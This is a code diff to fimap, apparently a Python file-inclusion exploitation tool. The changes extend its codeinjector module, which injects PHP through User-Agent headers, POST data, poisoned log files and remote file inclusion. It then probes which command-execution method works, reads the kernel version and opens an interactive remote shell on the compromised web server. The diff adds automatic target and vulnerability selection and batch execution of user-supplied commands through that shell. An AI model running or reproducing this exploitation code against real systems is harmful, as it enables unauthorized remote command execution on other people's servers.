@@ -92,7 +92,69 @@ class codeinjector(baseClass):
         
         return(fpath, postdata, header_dict, payload)
 
+    def probeExecMethods(self, url, postdata, header_dict, domain, vuln):
+        working_shell = None
+        hostname = domain.getAttribute("hostname")
+        mode = vuln.getAttribute("mode")
+        fpath = vuln.getAttribute("path")
+        param = vuln.getAttribute("param")
+        prefix = vuln.getAttribute("prefix")
+        suffix = vuln.getAttribute("suffix")
+        appendix = vuln.getAttribute("appendix")
+        shcode = vuln.getAttribute("file")
+        paramvalue = vuln.getAttribute("paramvalue")
+        kernel = domain.getAttribute("kernel")
+        ispost = int(vuln.getAttribute("ispost"))
+        language = vuln.getAttribute("language")
+        isUnix = vuln.getAttribute("os") == "unix"
+        
+        xml2config = self.config["XML2CONFIG"]
+        langClass = xml2config.getAllLangSets()[language]
+        shellquiz, shellanswer = xml2config.generateShellQuiz(isUnix)
+        shell_test_code = shellquiz
+        shell_test_result = shellanswer        
+        for item in langClass.getExecMethods():
+            try:
+                name = item.getName()
+                payload = None
+                if (item.isUnix() and isUnix) or (item.isWindows() and not isUnix):
+                    self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
+                    testload = item.generatePayload(shell_test_code)
+                    if (mode.find("A") != -1):
+                        self.setUserAgent(testload)
+                        code = self.doPostRequest(url, postdata, header_dict)
+                    elif (mode.find("P") != -1):
+                        if (postdata != ""):
+                            testload = "%s&%s" %(postdata, testload)
+                        code = self.doPostRequest(url, testload, header_dict)
+                    elif (mode.find("R") != -1):
+                        code = self.executeRFI(url, postdata, appendix, testload, header_dict)
+                    elif (mode.find("L") != -1):
+                        testload = self.convertUserloadToLogInjection(testload)
+                        testload = "data=" + base64.b64encode(testload)
+                        if (postdata != ""):
+                            testload = "%s&%s" %(postdata, testload)
+                        code = self.doPostRequest(url, testload, header_dict)
+                    if code != None and code.find(shell_test_result) != -1:
+                        working_shell = item
+                        self._log("Execution thru '%s' works!"%(name), self.LOG_ALWAYS)
+                        if (kernel == None):
+                            self._log("Requesting kernel version...", self.LOG_DEBUG)
+                            uname_cmd = item.generatePayload(xml2config.getKernelCode(isUnix))
+                            kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, langClass, suffix, headerDict=header_dict).strip()
+                            self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
+                            domain.setAttribute("kernel", kernel)
+                            self.saveXML()
 
+                        break
+                else:
+                    self._log("Skipping execution method '%s'..."%(name), self.LOG_DEBUG)
+                     
+            except KeyboardInterrupt:
+                self._log("Aborted by user.", self.LOG_WARN)
+
+        return(working_shell)
+    
     def start(self, OnlyExploitable):
         domain = self.chooseDomains(OnlyExploitable)
         vuln   = self.chooseVuln(domain.getAttribute("hostname"))
@@ -144,14 +206,17 @@ class codeinjector(baseClass):
 
 
         if (mode.find("A") != -1 and mode.find("x") != -1):
+            # Some exploit which is exploitable by changing the useragent.
             self._log("Testing %s-code injection thru User-Agent..."%(language), self.LOG_INFO)
             code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
 
         elif (mode.find("P") != -1 and mode.find("x") != -1):
+            # Some exploit which is exploitable by sending POST requests.
             self._log("Testing %s-code injection thru POST..."%(language), self.LOG_INFO)
             code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
             
         elif (mode.find("L") != -1):
+            # Some exploit which is exploitable by injecting specially crafted log entries.
             if (mode.find("H") != -1):
                 self._log("Testing %s-code injection thru Logfile HTTP-UA-Injection..."%(language), self.LOG_INFO)
             elif (mode.find("F") != -1):
@@ -161,6 +226,7 @@ class codeinjector(baseClass):
             code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
             
         elif (mode.find("R") != -1):
+            # Some exploit which is exploitable by loading pages through another website (RFI)
             suffix = appendix
             if settings["dynamic_rfi"]["mode"] == "ftp":
                 self._log("Testing code thru FTP->RFI...", self.LOG_INFO)
@@ -188,7 +254,52 @@ class codeinjector(baseClass):
             else:
                 print "fimap is currently not configured to exploit RFI vulnerabilities."
                 sys.exit(1)
-        
+        elif (mode.find("r") != -1):
+            # Some point which we know that we can include files but we haven't found any good vectors.
+            self._log("You have selected a file which is only readable.", self.LOG_ALWAYS)
+            self._log("Let's see if one of our plugins is interested in it...", self.LOG_ALWAYS)
+            textarr = []
+            idx = 1
+            choose = {}
+            header = "Fallback Plugin Selection"
+            pluginman = self.config["PLUGINMANAGER"]
+            plugin_attacks = pluginman.requestPluginFallbackActions(langClass)
+            for attacks in plugin_attacks:
+                pluginName, attackmode = attacks
+                label, callback = attackmode
+                textarr.append("[%d] [%s] %s" %(idx, pluginName, label))
+                choose[idx] = callback
+                idx += 1
+
+            textarr.append("[q] Quit")
+            
+            if (idx == 1):
+                print "Sorry. No plugin was interested :("
+                sys.exit(0)
+            else:
+                inp = ""
+                val = -1
+                
+                while (1==1):
+                    self.drawBox(header, textarr)
+                    inp = raw_input("Your Selection: ")
+                    if (inp == "q" or inp == "Q"):
+                        break
+                    try:
+                        val = int(inp)
+                        if (val < 0 or val > idx-1):
+                            print "Invalid selection index. Hit 'q' to quit."
+                        else:
+                            haxhelper = HaxHelper(self, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, None)
+                            plugman.broadcast_callback(choose[val], haxhelper)
+                    except:
+                        print "Invalid number selected. Hit 'q' to quit."
+                    
+
+                    
+            sys.exit(1)
+            
+            
         if code == None:
             self._log("%s-code testing failed! code=None"%(language), self.LOG_ERROR)
             sys.exit(1)
@@ -197,53 +308,20 @@ class codeinjector(baseClass):
         if (code.find(php_test_result) != -1):
             self._log("%s Injection works! Testing if execution works..."%(language), self.LOG_ALWAYS)
             php_inject_works = True
-            shellquiz, shellanswer = xml2config.generateShellQuiz(isUnix)
-            shell_test_code = shellquiz
-            shell_test_result = shellanswer
-            for item in langClass.getExecMethods():
-                try:
-                    name = item.getName()
-                    payload = None
-                    if (item.isUnix() and isUnix) or (item.isWindows() and not isUnix):
-                        self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
-                        testload = item.generatePayload(shell_test_code)
-                        if (mode.find("A") != -1):
-                            self.setUserAgent(testload)
-                            code = self.doPostRequest(url, postdata, header_dict)
-                        elif (mode.find("P") != -1):
-                            if (postdata != ""):
-                                testload = "%s&%s" %(postdata, testload)
-                            code = self.doPostRequest(url, testload, header_dict)
-                        elif (mode.find("R") != -1):
-                            code = self.executeRFI(url, postdata, appendix, testload, header_dict)
-                        elif (mode.find("L") != -1):
-                            testload = self.convertUserloadToLogInjection(testload)
-                            testload = "data=" + base64.b64encode(testload)
-                            if (postdata != ""):
-                                testload = "%s&%s" %(postdata, testload)
-                            code = self.doPostRequest(url, testload, header_dict)
-                        if code != None and code.find(shell_test_result) != -1:
-                            sys_inject_works = True
-                            working_shell = item
-                            self._log("Execution thru '%s' works!"%(name), self.LOG_ALWAYS)
-                            if (kernel == None):
-                                self._log("Requesting kernel version...", self.LOG_DEBUG)
-                                uname_cmd = item.generatePayload(xml2config.getKernelCode(isUnix))
-                                kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, langClass, suffix, headerDict=header_dict).strip()
-                                self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
-                                domain.setAttribute("kernel", kernel)
-                                self.saveXML()
-    
-                            break
-                    else:
-                        self._log("Skipping execution method '%s'..."%(name), self.LOG_DEBUG)
-                         
-                except KeyboardInterrupt:
-                    self._log("Aborted by user.", self.LOG_WARN)
+            
+            working_shell = self.probeExecMethods(url, postdata, header_dict, domain, vuln)
+            sys_inject_works = False
+            if (working_shell != None):
+                sys_inject_works = True
+                
                     
             attack = None
             while (attack != "q"):
-                attack = self.chooseAttackMode(language, php_inject_works, sys_inject_works, isUnix)
+                attack = None
+                if (self.config["p_exploit_cmds"] != None):
+                    attack = "fimap_shell"
+                else:
+                    attack = self.chooseAttackMode(language, php_inject_works, sys_inject_works, isUnix)
                 
 
                 if (type(attack) == str):
@@ -284,7 +362,7 @@ class codeinjector(baseClass):
                         if (ls_cmd != None):
                             commands.append(ls_cmd)
                             
-                        pwd_cmd = item.generatePayload(xml2config.concatCommands(commands, isUnix))
+                        pwd_cmd = working_shell.generatePayload(xml2config.concatCommands(commands, isUnix))
                         tmp = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix, headerDict=header_dict).strip()
                         if (tmp.strip() == ""):
                             print "Failed to setup shell! The resulting string was empty!"
@@ -312,14 +390,27 @@ class codeinjector(baseClass):
                         print shell_banner
 
                         while 1==1:
-                            cmd = raw_input("fishell@%s:%s$> " %(curusr,curdir))
+                            cmd = None
+                            if (self.config["p_exploit_cmds"] != None):
+                                # Execute commands the user defined through parameters.
+                                if (len(self.config["p_exploit_cmds"]) > 0):
+                                    cmd = self.config["p_exploit_cmds"][0]
+                                    self._log("Executing command: %s" %(cmd), self.LOG_INFO)
+                                    del(self.config["p_exploit_cmds"][0])
+                                else:
+                                    self._log("Done with user supplied command batch.", self.LOG_INFO);
+                                    sys.exit(0)
+                                    
+                            else:
+                                # Ask the user for a shell command.
+                                cmd = raw_input("fishell@%s:%s$> " %(curusr,curdir))
                             if cmd == "q" or cmd == "quit": break
                             
                             try:
                                 if (cmd.strip() != ""):
                                     commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd)
                                     cmds = xml2config.concatCommands(commands, isUnix)
-                                    userload = item.generatePayload(cmds)
+                                    userload = working_shell.generatePayload(cmds)
                                     code = self.__doHaxRequest(url, postdata, mode, userload, langClass, suffix, headerDict=header_dict)
                                     if (cmd.startswith("cd ")):
                                         # Get Current Directory...
@@ -723,12 +814,35 @@ class codeinjector(baseClass):
             else:
                 missingCount += 1
     
-        textarr.append("[ ] And %d hosts with no valid attack vectors."%(missingCount))
-        textarr.append("    Type '?' to see what it means.")
+        if (idx == 1):
+            print "No exploitable domains found."
+            if (missingCount > 0):
+                print "There are some domains hidden tho because they can't be exploited by fimap without help."
+                print "To show them start fimap with *uppercase* -X"
+            sys.exit(0)
+    
+        if (missingCount > 0):
+            textarr.append("[ ] And %d hosts with no valid attack vectors."%(missingCount))
+            textarr.append("    Type '?' to see what it means.")
         textarr.append("[q] Quit")
         self.drawBox(header, textarr)
         if (doRemoteWarn):
             print "WARNING: Some domains may be not listed here because dynamic_rfi is not configured! "
+
+        # If the user has picked the domain already through a parameter
+        # we just try to set it here and return its result.
+        if (self.config["p_exploit_domain"] != None):
+            wantedDomain = self.config["p_exploit_domain"]
+            self._log("Trying to autoselect target with hostname '%s'..." %(wantedDomain), self.LOG_INFO)
+
+            for n in nodes:
+                if (n.getAttribute("hostname") == wantedDomain):
+                    return(n)
+            
+            print "The domain '%s' doesn't exist! Can't continue :(" %(wantedDomain)
+            sys.exit(1)
+
+
 
         while(1==1):
             c = raw_input("Choose Domain: ")
@@ -769,6 +883,17 @@ class codeinjector(baseClass):
         idx = 1
         header = ":: FI Bugs on '" + hostname + "' ::"
         textarr = []
+        hasAtLeastAReadable = False
+        readableNode = None
+        
+        # If the user has picked the exploitmode already through a parameter
+        # we just try to set it here and run the fallback selection.
+        wantedID = None
+        if (self.config["p_exploit_script_id"] != None):
+            wantedID = self.config["p_exploit_script_id"]
+
+        
+        
         for n in nodes:
             path = n.getAttribute("path")
             file = n.getAttribute("file")
@@ -780,6 +905,9 @@ class codeinjector(baseClass):
                 doRemoteWarn = True
 
             if (mode.find("x") != -1 or (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] in ("ftp", "local"))):
+                if (wantedID != None and wantedID == idx):
+                    self._log("Autoselected vulnerability with ID %d."%wantedID, self.LOG_INFO)
+                    return(n)
                 choose[idx] = n
                 if (ispost == 0):
                     textarr.append("[%d] URL: '%s' injecting file: '%s' using GET-param: '%s'" %(idx, path, file, param))
@@ -788,12 +916,18 @@ class codeinjector(baseClass):
                 elif (ispost == 2):
                     textarr.append("[%d] URL: '%s' injecting file: '%s' using HEADER-param: '%s'" %(idx, path, file, param))
                 idx = idx +1
-
+            elif (mode.find("r") != -1):
+                hasAtLeastAReadable = True
+                readableNode = n
+            
         if (idx == 1):
             if (doRemoteWarn):
                 print "WARNING: Some bugs can not be used because dynamic_rfi is not configured!"
-            print "This domain has no usable bugs."
-            sys.exit(1)
+            if (hasAtLeastAReadable):
+                return(n)
+            else:
+                print "This domain has no usable bugs."
+                sys.exit(1)
 
         
         textarr.append("[q] Quit")
@@ -801,6 +935,8 @@ class codeinjector(baseClass):
 
         if (doRemoteWarn):
             print "WARNING: Some bugs are suppressed because dynamic_rfi is not configured!"
+
+        
 
         while (1==1):
             c = raw_input("Choose vulnerable script: ")
